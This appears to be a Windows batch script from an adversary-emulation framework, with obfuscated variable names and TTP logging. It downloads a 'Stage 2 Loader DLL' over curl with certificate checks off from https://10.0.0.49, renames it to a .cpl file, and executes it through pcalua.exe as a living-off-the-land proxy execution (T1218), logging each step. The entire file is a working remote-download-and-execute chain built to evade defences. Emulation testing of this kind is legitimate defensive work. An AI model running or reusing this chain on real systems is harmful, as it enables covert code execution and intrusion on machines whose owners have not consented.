@echo off
setlocal enabledelayedexpansion

REM ── SET variable preamble ──────────────────────────────────────────────────
SET bvkrwz=BALAM-S2B
SET qlmxdt=7
SET fnjpcs=%APPDATA%\7\macula-simulations.log
SET hwotgr=%APPDATA%\10422\a9836f0f
SET ydxmkl=5e71fe94.txt
SET czpvbn=10422
SET rkjsqf=https://10.0.0.49/stage/2/icon.png?10422-7
SET tnwbhp=%APPDATA%\7

REM ── Cache timestamp once at script start ───────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── Initialise log file (ensure parent dir exists, non-fatal) ──────────────
if not exist "!hwotgr!" mkdir "!hwotgr!" >nul 2>&1

REM ── DEBUG: script_start ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: script_start>> "!fnjpcs!" 2>nul

REM ── DEBUG: heartbeat_start ─────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: heartbeat_start>> "!fnjpcs!" 2>nul

REM ── Heartbeat fetch — downloads Stage 2 Loader DLL to disk ────────────────
curl -k -s -o "!hwotgr!\!ydxmkl!" "!rkjsqf!"
SET hbresult=!ERRORLEVEL!

REM ── DEBUG: heartbeat_complete ──────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: heartbeat_complete=!hbresult!>> "!fnjpcs!" 2>nul

REM ── DEBUG: chdir_start ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: chdir_start>> "!fnjpcs!" 2>nul

REM ── Change working directory to output location ───────────────────────────
cd /d "!hwotgr!" >nul 2>&1
SET cdresult=!ERRORLEVEL!

REM ── DEBUG: chdir_result ───────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: chdir_result=!cdresult!>> "!fnjpcs!" 2>nul

REM ── Rename downloaded Loader DLL to CPL for pcalua LOLBIN invocation ──────
REM DEBUG: rename_start
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: rename_start>> "!fnjpcs!" 2>nul

rename "!ydxmkl!" pcafile.cpl >nul 2>&1
SET rnresult=!ERRORLEVEL!

REM ── DEBUG: rename_result ──────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: rename_result=!rnresult!>> "!fnjpcs!" 2>nul

REM ── DEBUG: process_start / dll_load ──────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: process_start>> "!fnjpcs!" 2>nul
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: dll_load>> "!fnjpcs!" 2>nul

REM ── T1218 — System Binary Proxy Execution via pcalua.exe (LOLBIN) ─────────
REM    pcafile.cpl must export CPlApplet; pcalua.exe loads it as a CPL module.
pcalua.exe -a "!hwotgr!\pcafile.cpl"
SET lolresult=!ERRORLEVEL!

REM ── DEBUG: command_execution_result ──────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: command_execution_result=!lolresult!>> "!fnjpcs!" 2>nul

REM ── Refresh timestamp for TTP log line ───────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── Per-TTP log line — T1218 System Binary Proxy Execution ───────────────
if !lolresult! EQU 0 (
    echo [!tsvar!][TTP][!bvkrwz!][!czpvbn!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!fnjpcs!" 2>nul
) else (
    if !rnresult! NEQ 0 (
        echo [!tsvar!][TTP][!bvkrwz!][!czpvbn!]: T1218^|System Binary Proxy Execution=[FAIL]:[dll_not_found]>> "!fnjpcs!" 2>nul
    ) else (
        echo [!tsvar!][TTP][!bvkrwz!][!czpvbn!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!fnjpcs!" 2>nul
    )
)

REM ── DEBUG: script_end ─────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!czpvbn!]: script_end>> "!fnjpcs!" 2>nul

endlocal